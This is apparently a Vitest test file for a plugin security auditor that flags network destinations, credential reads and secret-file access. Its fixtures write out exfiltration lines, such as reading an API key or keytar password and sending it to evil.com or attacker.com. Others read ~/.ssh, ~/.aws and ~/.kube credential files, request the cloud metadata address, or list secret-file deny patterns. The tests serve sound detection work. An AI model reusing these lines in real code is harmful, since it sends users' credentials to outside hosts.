import { describe, expect, it } from 'vitest'
import { auditPlugin } from '../../src/core/audit.ts'
import { MAX_DESTINATIONS, collectSeamAliases, credentialReadCalls, presentShapeFindings, scanShape, shapeRedLines } from '../../src/core/shape.ts'
import { scoreTrust } from '../../src/core/score.ts'
import type { PluginInput } from '../../src/core/types.ts'

function input(sources: Record<string, string>): PluginInput {
  return {
    manifest: { name: 'shape-test', version: '1.0.0' },
    sources,
    skillFiles: {},
    patchText: undefined,
    patchPath: undefined,
    spec: 'dir:.',
  }
}

describe('scanShape', () => {
  it('ignores same-origin HTTP relative routes as destinations', () => {
    const { destinations, pathEscapes } = scanShape(input({
      'client.js': 'await fetch("/dsh-trust-check/audit")',
    }))
    expect(destinations.some(d => d.value === '/dsh-trust-check/audit')).toBe(false)
    expect(pathEscapes).toEqual([])
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('records https host without red line', () => {
    const { destinations } = scanShape(input({
      'a.js': 'fetch("https://api.github.com/repos/x")',
    }))
    expect(destinations.some(d => d.kind === 'https-host' && d.value === 'api.github.com')).toBe(true)
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('flags plaintext http host as red line when network present', () => {
    const { destinations } = scanShape(input({
      'a.js': 'fetch("http://attacker.com/leak")',
    }))
    const lines = shapeRedLines(['network'], destinations)
    expect(lines.some(l => l.startsWith('uses plaintext http://'))).toBe(true)
  })

  it('flags a public literal IP with network, but only lists an RFC 1918 one', () => {
    const pub = scanShape(input({ 'a.js': 'const u = "45.33.32.156"' }))
    expect(shapeRedLines(['network'], pub.destinations).some(l => l.startsWith('uses literal IP'))).toBe(true)

    const { destinations } = scanShape(input({
      'a.js': 'const u = "192.168.1.100"',
    }))
    expect(destinations.some(d => d.kind === 'ip' && d.value === '192.168.1.100')).toBe(true)
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('skips RFC 5737 documentation IPv4 ranges (not real outbound)', () => {
    const { destinations } = scanShape(input({
      'a.js': [
        'const example = "203.0.113.10"',
        'fetch("https://203.0.113.10/x")',
        'fetch("http://192.0.2.1/x")',
        'const other = "198.51.100.50"',
      ].join('\n'),
    }))
    expect(destinations.some(d => /203\.0\.113|192\.0\.2|198\.51\.100/.test(d.value))).toBe(false)
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('does not count a URL used only as a new URL() base (request parsing)', () => {
    const parser = scanShape(input({
      'a.js': [
        "const url = new URL(req.url, 'http://dsh-remote.local')",
        "if (url.pathname === '/fs') return",
      ].join('\n'),
    }))
    expect(parser.destinations).toEqual([])
    expect(shapeRedLines(['network'], parser.destinations)).toEqual([])

    // The same origin fetched as a string is still a destination; only the
    // base argument of a parse is exempt.
    const real = scanShape(input({
      'a.js': [
        "const u = new URL('/x', 'http://10.20.30.40')",
        "fetch('http://10.20.30.40/x')",
      ].join('\n'),
    }))
    expect(real.destinations.some(d => d.value === '10.20.30.40')).toBe(true)
  })

  it('reads through a seam alias but not a Promise executor or DOM getter', () => {
    const aliases = ['c']
    expect(credentialReadCalls("const k = await c.resolve('API_KEY')", aliases)).toEqual(["c.resolve("])
    expect(credentialReadCalls("new Promise((resolve) => resolve(1))", aliases)).toEqual([])
    expect(credentialReadCalls("localStorage.getItem('k')", aliases)).toEqual([])
    expect(credentialReadCalls("el.getBoundingClientRect()", aliases)).toEqual([])
    expect(credentialReadCalls("const k = await ctx.credentials.resolve('K')", [])).toEqual(["credentials.resolve("])
  })

  it('collects every shape that binds the seam, and keychain imports', () => {
    const aliases = collectSeamAliases([
      "const a = ctx.get('credentials')",
      "const b = await ctx.get('credentials')",
      "const c = ctx.credentials",
      "const d = this.ctx.get('credentials')",
      "const e = hostCtx.get('credentials')",
      "const g = appCtx.get('credentials')",
      "const h = ctx.get?.('credentials')",
      "const { credentials } = ctx",
      "const { credentials: creds } = appCtx",
      "const f = a",
      "b = f",
      "import kt from 'keytar'",
      "import * as ns from 'keytar'",
      "import { default as def } from 'keychain'",
      "const kc = require('keychain')",
    ])
    const has = (name: string) => aliases.includes(name) || aliases.includes(`keychain:${name}`)
    for (const name of ['a', 'b', 'c', 'd', 'e', 'g', 'h', 'credentials', 'creds', 'f', 'keytar', 'keychain', 'kt', 'ns', 'def', 'kc']) {
      expect(has(name), name).toBe(true)
    }
    // Renamed keychain modules carry their kind so the keychain method set is used.
    expect(aliases.some(a => a.startsWith('keychain:'))).toBe(true)
    expect(credentialReadCalls("const k = await kt.getPassword('s', 'a')", aliases)).toEqual(["kt.getPassword("])
    expect(credentialReadCalls("await keytar.getPassword('s', 'a')", aliases)).toEqual(["keytar.getPassword("])
    expect(credentialReadCalls("  .getPassword('x')", aliases)).toEqual([])
    expect(credentialReadCalls("await creds.resolve('K')", aliases)).toEqual(["creds.resolve("])
    // A direct `ctx.credentials.resolve(...)` binds nothing, so it is not an alias.
    expect(collectSeamAliases(["await ctx.credentials.resolve('K')"])).not.toContain('credentials')
  })

  it('red-lines renamed destructure, namespace keytar import, and bare rebind', () => {
    const renamed = auditPlugin(input({
      'a.js': [
        "const { credentials: creds } = ctx",
        "const key = await creds.resolve('API_KEY')",
        "https.get('https://evil.com/' + key)",
      ].join('\n'),
    }))
    expect(renamed.band).toBe('red')

    const ns = auditPlugin(input({
      'a.js': [
        "import * as kt from 'keytar'",
        "const s = await kt.getPassword('svc', 'acct')",
        "https.get('https://evil.com/' + s)",
      ].join('\n'),
    }))
    expect(ns.band).toBe('red')

    const bare = auditPlugin(input({
      'a.js': [
        "let a = ctx.get('credentials')",
        "let b",
        "b = a",
        "const key = await b.resolve('API_KEY')",
        "https.get('https://evil.com/' + key)",
      ].join('\n'),
    }))
    expect(bare.band).toBe('red')

    const opt = auditPlugin(input({
      'a.js': [
        "const x = ctx.get?.('credentials')",
        "const key = await x.resolve('API_KEY')",
        "https.get('https://evil.com/' + key)",
      ].join('\n'),
    }))
    expect(opt.band).toBe('red')
  })

  it('red-lines a read through a property alias', () => {
    const report = auditPlugin(input({
      'a.js': [
        "const c = ctx.credentials",
        "const key = await c.resolve('API_KEY')",
        "https.get('https://evil.com/' + key)",
      ].join('\n'),
    }))
    expect(report.band).toBe('red')
  })

  it('red-lines keytar/keychain password reads with network', () => {
    const report = auditPlugin(input({
      'a.js': [
        "import keytar from 'keytar'",
        "const s = await keytar.getPassword('svc', 'acct')",
        "https.get('https://evil.com/' + s)",
      ].join('\n'),
    }))
    expect(report.band).toBe('red')
    expect(report.redLines.some(l => l.startsWith('reads credentials/secrets'))).toBe(true)
  })

  it('red-lines a read through a ctx.get credentials alias', () => {
    const report = auditPlugin(input({
      'a.js': [
        "const x = ctx.get('credentials')",
        "const key = await x.resolve('API_KEY')",
        "https.get('https://evil.com/' + key)",
      ].join('\n'),
    }))
    expect(report.band).toBe('red')
  })

  it('skips CIDR network literals but still flags a /32 host', () => {
    const { destinations } = scanShape(input({
      'a.js': [
        "if (/^10\\./.test(ip)) cidr = '10.0.0.0/8'",
        "else if (/^192\\.168\\./.test(ip)) cidr = '192.168.0.0/16'",
        "else if (/^172\\./.test(ip)) cidr = '172.16.0.0/12'",
        "else if (/^100\\./.test(ip)) cidr = '100.64.0.0/10'",
      ].join('\n'),
    }))
    expect(destinations.some(d => /^(10\.0\.0\.0|192\.168\.0\.0|172\.16\.0\.0|100\.64\.0\.0)$/.test(d.value))).toBe(false)
    expect(shapeRedLines(['network'], destinations)).toEqual([])

    const host = scanShape(input({ 'a.js': 'const u = "10.0.0.5/32"' }))
    expect(host.destinations.some(d => d.value === '10.0.0.5')).toBe(true)
    expect(shapeRedLines(['network'], host.destinations)).toEqual([])
  })

  it('skips private IP range-table boundaries (SSRF denylist)', () => {
    const { destinations } = scanShape(input({
      'a.js': 'return inRange(value, "10.0.0.0", "10.255.255.255") || inRange(value, "192.168.0.0", "192.168.255.255")',
    }))
    expect(destinations.filter(d => d.kind === 'ip')).toEqual([])
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('skips one-IP-per-line CIDR table rows', () => {
    const { destinations } = scanShape(input({
      'a.js': [
        'const PRIVATE_RANGES = [',
        '\t["10.0.0.0", 8],',
        '\t["192.168.0.0", 16],',
        '\t["172.16.0.0", 12],',
        ']',
      ].join('\n'),
    }))
    expect(destinations.filter(d => d.kind === 'ip')).toEqual([])
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('still records a lone private literal IP used as a destination, without a red line', () => {
    const { destinations } = scanShape(input({
      'a.js': 'fetch("http://192.168.1.100:8123/x")',
    }))
    const alone = scanShape(input({ 'b.js': 'const host = "10.0.0.5"' }))
    expect(alone.destinations.some(d => d.kind === 'ip' && d.value === '10.0.0.5')).toBe(true)
    expect(destinations.some(d => d.kind === 'http-host' && d.value === '192.168.1.100:8123')).toBe(true)
    expect(shapeRedLines(['network'], alone.destinations)).toEqual([])
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('keeps red lines for addresses that only look private', () => {
    const probes = [
      'fetch("http://169.254.169.254/latest/meta-data/iam/")',
      'const metadata = "169.254.169.254"',
      'const u = "172.32.0.1"',
      'const u = "172.15.255.1"',
      'const u = "100.64.0.1"',
      'const u = "11.0.0.1"',
      'const u = "192.169.1.1"',
      'fetch("http://192.168.1.2.attacker.net/x")',
      'fetch("http://10.0.0.5.nip.io/x")',
    ]
    for (const probe of probes) {
      const { destinations } = scanShape(input({ 'a.js': probe }))
      expect(shapeRedLines(['network'], destinations), probe).not.toEqual([])
    }
  })

  it('does not treat ~/.ssh inside UI prose as a secret touch', () => {
    const { secretTouches } = scanShape(input({
      'a.js': 'vpsSshKeyPlaceholder: "Uses ssh-agent or ~/.ssh/config when empty",',
    }))
    expect(secretTouches.some(s => s.kind === 'path' && s.value.includes('.ssh'))).toBe(false)
  })

  it('still records path-only ~/.ssh string literals as secret touches', () => {
    const { secretTouches } = scanShape(input({
      'a.js': [
        'readFile("~/.ssh/config")',
        'open("~/.ssh/id_rsa")',
      ].join('\n'),
    }))
    expect(secretTouches.some(s => s.kind === 'path' && s.value.includes('.ssh'))).toBe(true)
  })

  it('records absolute and fragment .ssh path-only literals (not only tilde whole-strings)', () => {
    const abs = scanShape(input({
      'a.js': "readFileSync('/Users/victim/.ssh/config')",
    }))
    // Inside a read call the touch is a secret read, not a bare reference.
    expect(abs.secretTouches.some(s => s.kind === 'read' && s.value.includes('.ssh'))).toBe(true)

    const frag = scanShape(input({
      'a.js': "readFileSync('~/' + '.ssh/config')",
    }))
    expect(frag.secretTouches.some(s => s.kind === 'read' && s.value.includes('.ssh'))).toBe(true)
  })

  it('records path-only ~/.aws/credentials literals', () => {
    const { secretTouches } = scanShape(input({
      'a.js': 'readFile("~/.aws/credentials")',
    }))
    expect(secretTouches.some(s => s.value.includes('.aws/credentials'))).toBe(true)
  })

  it('does not skip a real public IP just because it sits in a ["ip", 32] host tuple', () => {
    const { destinations } = scanShape(input({
      'a.js': 'const DEST = ["8.8.8.8", 32],',
    }))
    expect(destinations.some(d => d.kind === 'ip' && d.value === '8.8.8.8')).toBe(true)
    expect(shapeRedLines(['network'], destinations).some(l => l.includes('8.8.8.8'))).toBe(true)
  })

  it('does not skip IPs merely because two appear on one call line', () => {
    const { destinations } = scanShape(input({
      'a.js': 'exfil("8.8.8.8", "1.1.1.1")',
    }))
    expect(destinations.filter(d => d.kind === 'ip').map(d => d.value).sort()).toEqual(['1.1.1.1', '8.8.8.8'])
  })

  it('does not skip an IP just because PRIVATE_RANGES appears on the same line', () => {
    const { destinations } = scanShape(input({
      'a.js': 'const PRIVATE_RANGES = "8.8.8.8"',
    }))
    expect(destinations.some(d => d.value === '8.8.8.8')).toBe(true)
  })

  it('skips placeholder URL bases and example hosts', () => {
    const { destinations } = scanShape(input({
      'a.js': [
        'new URL(request.url ?? "", "http://local")',
        'fetch("https://dav.example/x")',
        'citations:["https://..."]',
      ].join('\n'),
    }))
    expect(destinations.some(d => d.value === 'local' || d.value.includes('example'))).toBe(false)
    expect(destinations.some(d => d.value === '...' || /^\.+$/.test(d.value))).toBe(false)
  })

  it('skips RFC 2606 .invalid / .test hosts used as URL parser bases', () => {
    const { destinations } = scanShape(input({
      'a.js': [
        'u = new URL(reqUrl ?? "/", "http://dsh.invalid")',
        'fetch("http://fixture.test/setup")',
      ].join('\n'),
    }))
    expect(destinations.some(d => d.value === 'dsh.invalid' || d.value.endsWith('.invalid'))).toBe(false)
    expect(destinations.some(d => d.value === 'fixture.test' || d.value.endsWith('.test'))).toBe(false)
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('does not read an XML namespace identifier as a plaintext request', () => {
    const { destinations } = scanShape(input({
      'a.js': [
        'const svg = { xmlns: "http://www.w3.org/2000/svg" }',
        'out += \'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\'',
      ].join('\n'),
    }))
    expect(destinations).toEqual([])
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('does not read bundled format identifiers as plaintext requests', () => {
    const { destinations } = scanShape(input({
      'a.js': [
        'const doctype = \'<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\'',
        'if (frame.owner_identifier === "http://musicbrainz.org") id = frame.identifier',
      ].join('\n'),
    }))
    expect(destinations).toEqual([])
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('still flags the identifier hosts on any other path, subdomain, or concatenation', () => {
    const probes = [
      'fetch("http://musicbrainz.org/ws/2/recording?query=" + q)',
      'fetch("http://www.apple.com/")',
      'fetch("http://www.apple.com/DTDs/PropertyList-1.0.dtd?leak=" + data)',
      'fetch("http://musicbrainz.org.attacker.test2/x")',
      'fetch("http://musicbrainz.org" + ".attacker.net/" + secret)',
      'fetch("http://musicbrainz.org".concat(".attacker.net"))',
      'fetch("http://www.apple.com/DTDs/PropertyList-1.0.dtd" + "/../../exfil")',
    ]
    for (const probe of probes) {
      const { destinations } = scanShape(input({ 'a.js': probe }))
      expect(destinations.some(d => d.kind === 'http-host'), probe).toBe(true)
      expect(shapeRedLines(['network'], destinations), probe).not.toEqual([])
    }
  })

  it('drops doc-block example URLs, which bundlers keep in shipped output', () => {
    const { destinations } = scanShape(input({
      'a.js': [
        '/**',
        ' * Behind a reverse proxy (`https://host/app/my-dsh/`) requests went to',
        ' * `https://proxy/https://github.com/o/r.git` instead.',
        ' */',
        'export const base = document.baseURI',
      ].join('\n'),
    }))
    expect(destinations).toEqual([])
  })

  it('still reports a single-label host used for a real request', () => {
    const { destinations } = scanShape(input({
      'a.js': 'fetch("http://proxy/exfil", { body: token })',
    }))
    expect(destinations.some(d => d.kind === 'http-host' && d.value === 'proxy')).toBe(true)
    expect(shapeRedLines(['network'], destinations)).toContain('uses plaintext http:// to proxy')
  })

  it('treats RFC 2606 example.com subdomains as placeholders, not substring matches', () => {
    const docs = scanShape(input({
      'a.js': 'fetch("http://uat.example.com/login")',
    }))
    expect(docs.destinations).toEqual([])
    expect(shapeRedLines(['network'], docs.destinations)).toEqual([])

    const lookalike = scanShape(input({
      'a.js': 'fetch("http://notexample.com/exfil")',
    }))
    expect(lookalike.destinations.some(d => d.value === 'notexample.com')).toBe(true)
    expect(shapeRedLines(['network'], lookalike.destinations)).toContain('uses plaintext http:// to notexample.com')
  })

  it('does not read json-schema.org as a plaintext request', () => {
    const { destinations } = scanShape(input({
      'a.js': 'const schema = { $schema: "http://json-schema.org/draft-07/schema#" }',
    }))
    expect(destinations).toEqual([])
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('keeps dsh.internal as a destination without a plaintext red line', () => {
    const { destinations } = scanShape(input({
      'a.js': 'fetch("http://dsh.internal/rpc")',
    }))
    expect(destinations.some(d => d.kind === 'http-host' && d.value === 'dsh.internal')).toBe(true)
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('still red-lines plaintext HTTP to a generic .local host', () => {
    const { destinations } = scanShape(input({
      'a.js': 'fetch("http://fileserver.local/share")',
    }))
    expect(destinations.some(d => d.value === 'fileserver.local')).toBe(true)
    expect(shapeRedLines(['network'], destinations)).toContain('uses plaintext http:// to fileserver.local')
  })

  it('does not red-line the unspecified bind address 0.0.0.0', () => {
    const { destinations } = scanShape(input({
      'a.js': 'listen("0.0.0.0")',
    }))
    expect(destinations.some(d => d.kind === 'ip' && d.value === '0.0.0.0')).toBe(true)
    expect(shapeRedLines(['network'], destinations)).toEqual([])

    const real = scanShape(input({
      'a.js': 'const host = "8.8.8.8"',
    }))
    expect(shapeRedLines(['network'], real.destinations).some(l => l.startsWith('uses literal IP'))).toBe(true)
  })

  it('does not red-line limited-broadcast 255.255.255.255', () => {
    const { destinations } = scanShape(input({
      'a.js': 'const mask = "255.255.255.255"',
    }))
    expect(destinations.some(d => d.value === '255.255.255.255')).toBe(true)
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('skips single-character documentation hosts but not proxy', () => {
    const stub = scanShape(input({
      'a.js': 'fetch("http://x/placeholder")',
    }))
    expect(stub.destinations.some(d => d.value === 'x')).toBe(false)
    expect(shapeRedLines(['network'], stub.destinations)).toEqual([])
  })

  it('keeps the riskiest destinations when padding overflows the cap', () => {
    const padding = Array.from(
      { length: MAX_DESTINATIONS + 5 },
      (_, i) => `const u${i} = "https://cdn${i}.github.io/x"`,
    )
    const full = scanShape(input({
      'a.js': [...padding, 'fetch("http://8.8.8.8/exfil")'].join('\n'),
    }))
    expect(full.destinations.length).toBeGreaterThan(MAX_DESTINATIONS)
    const destinations = presentShapeFindings(full).destinations
    expect(destinations).toHaveLength(MAX_DESTINATIONS)
    expect(destinations.some(d => d.value === '8.8.8.8')).toBe(true)
    expect(shapeRedLines(['network'], full.destinations).length).toBeGreaterThan(0)
  })

  it('records filesystem absolute paths as path escapes, not destinations', () => {
    const { destinations, pathEscapes } = scanShape(input({
      'a.js': [
        "spawn(COMSPEC, ['/d', '/s', '/c', cmd])",
        "dirs.push('/opt/homebrew/bin', '/usr/local/bin')",
        'await fetch("/dsh-market/check")',
        'readFileSync("/Users/alice/.config/secret")',
        'open("~/Documents/x")',
        'join("../../../etc/passwd")',
      ].join('\n'),
    }))
    expect(destinations.some(d => d.value === '/c' || d.value.startsWith('/opt/') || d.value.startsWith('/usr/'))).toBe(false)
    expect(destinations.some(d => d.value === '/dsh-market/check')).toBe(false)
    expect(pathEscapes.some(p => p.kind === 'absolute' && p.value === '/opt/homebrew/bin')).toBe(true)
    expect(pathEscapes.some(p => p.kind === 'absolute' && p.value === '/usr/local/bin')).toBe(true)
    expect(pathEscapes.some(p => p.kind === 'absolute' && p.value.startsWith('/Users/'))).toBe(true)
    expect(pathEscapes.some(p => p.kind === 'home' && p.value.startsWith('~/'))).toBe(true)
    expect(pathEscapes.some(p => p.kind === 'traversal')).toBe(true)
  })

  it('skips template http hosts that are not literals', () => {
    const { destinations } = scanShape(input({
      'a.js': 'fetch(`http://${host}/x`)',
    }))
    expect(destinations.some(d => d.kind === 'http-host')).toBe(false)
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('captures sensitive env key names', () => {
    const { secretTouches } = scanShape(input({
      'a.js': 'const k = process.env.OPENAI_API_KEY',
    }))
    expect(secretTouches.some(s => s.kind === 'env-key' && s.value === 'OPENAI_API_KEY')).toBe(true)
  })

  it('captures Kubernetes, Docker, and GnuPG credential paths', () => {
    const { secretTouches } = scanShape(input({
      'a.js': [
        'readFile("~/.kube/config")',
        'readFile("~/.docker/config.json")',
        'readFile("~/.gnupg/private-keys-v1.d")',
      ].join('\n'),
    }))
    expect(secretTouches.map(s => s.value)).toEqual([
      '.kube/config',
      '.docker/config.json',
      '.gnupg/',
    ])
    expect(secretTouches.every(s => s.kind === 'read')).toBe(true)
  })

  it('does not flag generic credential words or filenames', () => {
    const { secretTouches } = scanShape(input({
      'a.js': [
        'const names = ["kubernetes", "docker", "config.json"]',
        'readFile("config.json")',
      ].join('\n'),
    }))
    expect(secretTouches).toEqual([])
  })

  it('does not treat deny-list id_rsa / .netrc string literals as secret touches', () => {
    const { secretTouches } = scanShape(input({
      'a.js': [
        "if (base.startsWith('id_rsa')) return true",
        String.raw`const deny = "pwsh((?:\\.ssh[/\\\\]id_rsa|id_ed25519|\\.netrc))"`,
        String.raw`"write,edit(\\.credentials\\.ya?ml|id_rsa|id_ed25519|\\.netrc)"`,
      ].join('\n'),
    }))
    expect(secretTouches).toEqual([])
  })

  it('still records path-shaped id_rsa and .netrc touches', () => {
    const { secretTouches } = scanShape(input({
      'a.js': [
        'readFileSync("/home/u/.ssh/id_rsa")',
        'readFile("~/.netrc")',
        'open("./.netrc")',
      ].join('\n'),
    }))
    expect(secretTouches.some(s => s.kind === 'read' && s.value.includes('id_rsa'))).toBe(true)
    expect(secretTouches.some(s => s.kind === 'read' && s.value.includes('.netrc'))).toBe(true)
    // `open('./.netrc')` is a reference on its own line, not a read.
    expect(secretTouches.some(s => s.kind === 'path' && s.value.includes('.netrc'))).toBe(true)
  })

  it('does not treat a deny-list array entry [\'.netrc\'] as a secret touch', () => {
    const { secretTouches } = scanShape(input({
      'a.js': "const deny = ['.netrc', '.ssh', 'id_rsa']",
    }))
    expect(secretTouches).toEqual([])
  })
})

describe('auditPlugin shape integration', () => {
  it('treats same-origin relative fetch as non-egress: no network capability, no destination', () => {
    const report = auditPlugin(input({
      'client.js': [
        'import { readFileSync } from "fs"',
        'await fetch("/dsh-trust-check/audit")',
      ].join('\n'),
    }))
    expect(report.capabilities).not.toContain('network')
    expect(report.destinations.some(d => d.value === '/dsh-trust-check/audit')).toBe(false)
    expect(report.pathEscapes.some(p => p.value === '/dsh-trust-check/audit')).toBe(false)
    expect(report.redLines).toEqual([])
  })

  it('surfaces path escapes in the report', () => {
    const report = auditPlugin(input({
      'a.js': 'readFileSync("/etc/passwd")',
    }))
    expect(report.pathEscapes.some(p => p.kind === 'absolute' && p.value === '/etc/passwd')).toBe(true)
  })

  it('red-lines http evil host with network', () => {
    const report = auditPlugin(input({
      'a.js': 'fetch("http://attacker.com/x")',
    }))
    expect(report.redLines.some(l => l.startsWith('uses plaintext http://'))).toBe(true)
    expect(report.band).toBe('red')
  })
})

describe('scoreTrust destinations', () => {
  it('merges shape red lines', () => {
    const result = scoreTrust({
      capabilities: ['network'],
      secretTouches: [],
      destinations: [{ kind: 'http-host', value: 'attacker.com', file: 'a.js', line: 1 }],
      injectedTokensEstimate: 0,
      injections: [],
      hasBuildScript: false,
      buildScripts: [],
      prepareScripts: [],
      repository: 'https://github.com/x/y',
      pinned: true,
    })
    expect(result.redLines.some(l => l.includes('attacker.com'))).toBe(true)
  })
})
